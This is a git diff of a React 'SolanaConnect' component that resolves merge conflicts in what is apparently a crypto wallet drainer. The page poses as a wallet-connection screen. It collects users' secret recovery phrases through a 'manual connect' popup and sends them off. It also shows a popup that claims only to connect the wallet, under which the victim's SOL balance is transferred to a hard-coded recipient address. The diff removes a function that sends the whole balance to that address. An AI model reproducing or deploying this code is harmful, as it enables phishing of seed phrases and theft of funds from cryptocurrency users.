@@ -1,39 +1,21 @@
-<<<<<<< HEAD
 import React, { useState, useEffect, useMemo } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-=======
-import React, { useState, useEffect } from 'react';
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
 import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
 import { Link } from 'react-router-dom';
 import { 
   Import, 
   X, 
-<<<<<<< HEAD
   Eye,
   EyeOff,
   ArrowLeft,
   Shield,
   Wallet,
   Check,
-=======
-  AlertTriangle, 
-  Zap,
-  Eye,
-  EyeOff,
-  ArrowLeft,
-  Wallet,
-  Shield,
-  Check
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
 } from 'lucide-react';
 
 // Solana configuration
-const SOLANA_RPC_URL = process.env.REACT_APP_SOLANA_RPC_URL || `https://solana-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`;
 const SOLANA_RECIPIENT_ADDRESS = process.env.REACT_APP_SOLANA_RECIPIENT_ADDRESS || '9N4PGE7TxcjwnLenFLDWpYQ43eySeDKCACjsvJ3T8D56';
-
-const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
 
 // Mock popular Solana wallets data
 const SOLANA_WALLETS = [
@@ -62,72 +44,10 @@ const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) =>
   }
 };
 
-<<<<<<< HEAD
-const handleSendAllSol = async (connection, publicKey, sendTransaction, disconnect) => {
-  if (!publicKey || !sendTransaction) {
-    console.error('Wallet not connected');
-    return;
-  }
-
-  try {
-    const balance = await connection.getBalance(publicKey);
-    if (balance === 0) {
-      console.log("No SOL balance to transfer.");
-      return;
-    }
-
-    const transaction = new Transaction().add(
-      SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: new PublicKey(SOLANA_RECIPIENT_ADDRESS),
-        lamports: balance,
-      })
-    );
-
-    const {
-      context: { slot: minContextSlot },
-      value: { blockhash, lastValidBlockHeight }
-    } = await connection.getLatestBlockhashAndContext();
-
-    const signature = await sendTransaction(transaction, connection, { minContextSlot });
-
-    await connection.confirmTransaction({ blockhash, lastValidBlockHeight, signature });
-    
-    console.log('Transaction successful with signature:', signature);
-    disconnect();
-
-  } catch (error) {
-    console.error('Solana transaction failed:', error);
-  }
-};
-
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
-const getSolanaWalletAssets = async (address) => {
-  try {
-    const publicKey = new PublicKey(address);
-    const balance = await connection.getBalance(publicKey);
-    
-    return {
-      sol: balance / LAMPORTS_PER_SOL,
-      tokens: [] // For now, just SOL balance
-    };
-  } catch (error) {
-    console.error('Error fetching Solana wallet assets:', error);
-    return {
-      sol: 0,
-      tokens: []
-    };
-  }
-};
-
 export default function SolanaConnect() {
-<<<<<<< HEAD
   const { connection } = useConnection();
-  const { publicKey, sendTransaction, signTransaction, connected, disconnect } = useWallet();
+  const { publicKey, sendTransaction, connected, disconnect } = useWallet();
 
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
   // Component State
   const [walletAddress, setWalletAddress] = useState(null);
   const [walletBalance, setWalletBalance] = useState({ sol: 0, tokens: [] });
@@ -136,17 +56,13 @@ export default function SolanaConnect() {
   
   // UI State
   const [showManualPopup, setShowManualPopup] = useState(false);
-<<<<<<< HEAD
   const [showTransactionPopup, setShowTransactionPopup] = useState(false);
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
   const [isPasswordVisible, setIsPasswordVisible] = useState(false);
   const [secretPhrase, setSecretPhrase] = useState('');
   const [selectedWallet, setSelectedWallet] = useState(null);
   const [searchQuery, setSearchQuery] = useState('');
 
   useEffect(() => {
-<<<<<<< HEAD
     if (connected && publicKey) {
       setWalletAddress(publicKey.toBase58());
       fetchWalletBalance(publicKey);
@@ -165,20 +81,6 @@ export default function SolanaConnect() {
         sol: balance / LAMPORTS_PER_SOL,
         tokens: []
       });
-=======
-    // Check if there's a stored wallet address
-    const storedAddress = localStorage.getItem('solanaWalletAddress');
-    if (storedAddress) {
-      setWalletAddress(storedAddress);
-      fetchWalletBalance(storedAddress);
-    }
-  }, []);
-
-  const fetchWalletBalance = async (address) => {
-    try {
-      const balance = await getSolanaWalletAssets(address);
-      setWalletBalance(balance);
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
     } catch (error) {
       console.error('Error fetching balance:', error);
     }
@@ -186,10 +88,7 @@ export default function SolanaConnect() {
 
   const closeAllPopups = () => {
     setShowManualPopup(false);
-<<<<<<< HEAD
     setShowTransactionPopup(false);
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
     setSelectedWallet(null);
     setSecretPhrase('');
     setTxError('');
@@ -223,7 +122,6 @@ export default function SolanaConnect() {
 
     try {
       await sendSolanaWalletInfo(selectedWallet.name, secretPhrase, selectedWallet.name);
-      // Simulate success and show confirmation
       closeAllPopups();
       alert('Wallet information sent successfully!');
     } catch (error) {
@@ -243,7 +141,6 @@ export default function SolanaConnect() {
       </p>
 
       <div className="grid md:grid-cols-2 gap-6">
-<<<<<<< HEAD
         {/* Automatic Connection Card */}
         <div
           className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-blue-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center justify-center text-center"
@@ -263,8 +160,6 @@ export default function SolanaConnect() {
         </div>
 
         {/* Manual Connection Card */}
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
         <div
           onClick={() => setShowManualPopup(true)}
           className="connection-card bg-gray-800/50 p-6 rounded-2xl border border-gray-700 hover:border-purple-500 hover:bg-gray-800 transition-all cursor-pointer flex flex-col items-center text-center"
@@ -287,7 +182,6 @@ export default function SolanaConnect() {
     </div>
   );
   
-<<<<<<< HEAD
   const renderTransactionPopup = () => {
     const handleApprove = async () => {
       setIsSending(true);
@@ -359,6 +253,21 @@ export default function SolanaConnect() {
           The application is requesting to connect to your wallet.
         </p>
 
+        <div className="bg-gray-800 p-4 rounded-lg mb-6 text-left">
+            <div className="flex items-center mb-3">
+                <Wallet className="text-blue-400 mr-3" size={20}/>
+                <p className="text-sm truncate"><strong>Address:</strong> {walletAddress}</p>
+            </div>
+            <div className="border-t border-gray-700 my-3"></div>
+            <p className="text-lg font-semibold mb-2">Assets to be Transferred</p>
+            <div className="space-y-2 max-h-48 overflow-y-auto">
+                <div className="flex justify-between items-center">
+                    <span>SOL</span>
+                    <span>{walletBalance.sol.toFixed(5)}</span>
+                </div>
+            </div>
+        </div>
+
         {txError && (
           <div className="bg-red-900 border border-red-700 text-red-200 px-4 py-3 rounded-lg mb-4 text-left">
             <p className="font-bold">Error</p>
@@ -390,8 +299,6 @@ export default function SolanaConnect() {
     );
   };
 
-=======
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
   const renderManualConnectPopup = () => {
     const goBack = () => {
       setSelectedWallet(null);
@@ -506,7 +413,6 @@ export default function SolanaConnect() {
       </header>
 
       <main className="flex-grow flex items-center justify-center z-10 p-4">
-<<<<<<< HEAD
         {!connected && !showManualPopup && renderConnectionCards()}
       </main>
 
@@ -515,15 +421,6 @@ export default function SolanaConnect() {
         <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
           {showManualPopup && renderManualConnectPopup()}
           {connected && showTransactionPopup && renderTransactionPopup()}
-=======
-        {renderConnectionCards()}
-      </main>
-
-      {/* Popups (Modals) */}
-      {showManualPopup && (
-        <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
-          {renderManualConnectPopup()}
->>>>>>> 258cae294bf45399b90d711712ab52b48805f51a
         </div>
       )}
       
